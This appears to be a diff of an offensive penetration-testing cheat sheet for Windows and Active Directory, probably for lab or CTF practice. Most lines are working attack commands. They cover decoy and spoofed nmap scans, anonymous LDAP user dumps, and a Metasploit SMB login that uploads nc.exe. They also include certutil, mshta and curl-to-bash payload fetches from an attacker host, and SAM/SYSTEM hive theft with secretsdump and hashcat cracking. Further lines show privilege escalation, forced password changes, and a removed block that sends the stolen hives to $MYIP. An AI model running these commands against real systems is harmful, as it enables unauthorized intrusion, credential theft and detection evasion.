@@ -5,18 +5,22 @@ export KRB5CCNAME='/home/user/VICTIM@dc01@EXAMPLE.COM.ccache'
 
 # Host Discovery
 ## External
-nmap -Pn "$TARGET" -p- --min-rate 3000 --mtu 24
+nmap -Pn "$TARGET" -p- -D 1.1.1.1 -g53 --min-rate 500 --max-rate 1500 --spoof-mac 6C45C4
 
 ## Internal
-nmap -Pn "$TARGET" -p- --min-rate 3000 --mtu 24
+nmap -Pn "$TARGET" -p- -D 1.1.1.1 -g53 --min-rate 500 --max-rate 1500 --spoof-mac 6C45C4
 
 # Service Enumeration
 ## Nmap All Scripts
 nmap -Pn -sSV "$TARGET" -p22,80,445 --min-rate=3000 --mtu 24 -sC
 
 ## LDAP
-ldap=$(nmap --script "ldap* and not brute" -p 389 "$TARGET"); echo "$ldap"
+nmap --script "ldap* and not brute" -p 389 "$TARGET"
 ldapsearch -H ldap://$TARGET -x -s base namingcontexts
+ldapsearch -H ldap://$TARGET -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)"
+ldapsearch -H ldap://$TARGET -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=dn: ).*' | grep -oP '(^[^@]+)'
+ldapsearch -H ldap://$TARGET -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=userPrincipalName: ).*' | grep -oP '(^[^@]+)'
+ldapsearch -H ldap://$TARGET -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=description: ).*'
 ldapsearch -H ldap://$DC/ -D "$DOM\P.Rosa" -w 'Rosaisbest123' -b "" -s base "(objectClass=*)" | grep -v 'supported'
 ldapsearch -H ldap://$DC/ -D "$DOM\P.Rosa" -w 'Rosaisbest123' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
 
@@ -60,6 +64,11 @@ ascii
 impacket-samrdump "$TARGET"
 nxc smb "$TARGET" -u usernames -p passwords --rid-brute 10000
 nxc smb "$TARGET" -u usernames -p passwords --shares
+msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set CreateSession true; run"
+sessions -i 1
+shares -i C$
+cd programdata
+upload nc.exe
 impacket-smbclient $DOM/'user':'password'@$TARGET
 shares
 use
@@ -83,11 +92,20 @@ wafw00f http://$TARGET
 
 ## WordPress Discovery
 wpscan --url http://$TARGET/wordpress --enumerate
+Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 ## Directory Discovery
-ffuf -u 'http://$TARGET/FUZZ' -t 400 -rate 10000 -e .php -v -recursion -mc 200,301 \
--w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+ffuf -u http://"$TARGET"/FUZZ -t 800 -rate 20000 \
+-e txt,pdf,conf,config,cnf,html,php,asp,aspx,js \
+-v -recursion -recursion-depth 2 \
+-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
 2>/dev/null | grep -oP '(http.*)(?<!/)$'
+feroxbuster -u http://$TARGET \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+-d 4 -k -C 404 \
+-x pdf txt bak backup conf config cnf php asp aspx js \
+--dont-scan '(?i)(vendor|img|.*(min|gif|css|images|png|jpg)$)'
+
 
 ## Directory Traversal
 ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 400 -rate 10000 -v -mc 200 \
@@ -142,7 +160,9 @@ mshta.exe http://$MYIP:8080/nZzLAD.hta
 sessions -i 1
 
 ## RDP
-xfreerdp /u:'bob' /p:'pass123' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution
+xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
+xfreerdp /u:'bob' /p:'pass123' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution +clipboard
+
 
 ## MSSQL
 [*] nc.exe
@@ -152,6 +172,13 @@ netexec mssql $TARGET -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'certutil -urlca
 sessions -i 1 -c 'C:\programdata\GodPotato-NET4.exe -cmd "cmd /c whoami /priv"'
 sessions -i 1 -C 'getsystem'
 sessions -i 1
+
+## impacket
+impacket-changepasswd -debug -dc-ip $TARGET $DC/"$USERNAME":"$PASSWORD"@$TARGET -newpass 'NewPassword123!'
+
+## Git
+git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
+
 
 # Post Exploitation 
 
@@ -168,11 +195,30 @@ curl $TARGET:8088/linpeas.sh | bash
 
 ## Windows
 [*] Enumeration
+powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
+cd C:\ & dir /S /B SAM == SYSTEM == SAM.* == SYSTEM.*
+icacls C:\Windows\System32\Config
 whoami /priv
+cd C:\users; tree /f
 wmic useraccount get name,sid
-cd C:\users
-tree /f
 powershell -c "Set-ExecutionPolicy unrestricted"
+
+[*] nxc
+nxc winrm $TARGET -u '$USERNAME' -p '$PASSWORD' --sam --dump-method powershell
+
+
+[*] SAM NTLM
+cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM;
+download SAM
+download SYSTEM
+impacket-secretsdump LOCAL -sam SAM -system SYSTEM
+echo 'Administrator:500:...................' > hashes
+hashcat -m 1000 -a 0 hashes rockyou
+
+
+[*] SeBackupPrivilege
+robocopy /b \Users\Administrator\Desktop .
+
 
 [*] File Transfer
 python3 -m http.server -d Downloads/upload/windows 8088
@@ -200,18 +246,6 @@ powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Common Applica
 [*] Metasploit
 meterpreter > use priv
 meterpreter > getsystem
-
-[*] nxc
-nxc winrm $TARGET -u 'username' -p 'password' -x \
-'
-powershell -c rm *.SAV
-powershell -c reg save HKLM\SYSTEM SYSTEM.SAV
-powershell -c reg save HKLM\SAM SAM.SAV
-powershell -c compress-archive *.SAV SAM.zip
-powershell -c dir
-iwr http://$MYIP:4444 -Method POST -InFile SAM.zip
-'; unzip -o SAM.zip; \
-impacket-secretsdump LOCAL -sam SAM.SAV -system SYSTEM.SAV
 
 [*] Powerview
 powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programdata\powerview.ps1"
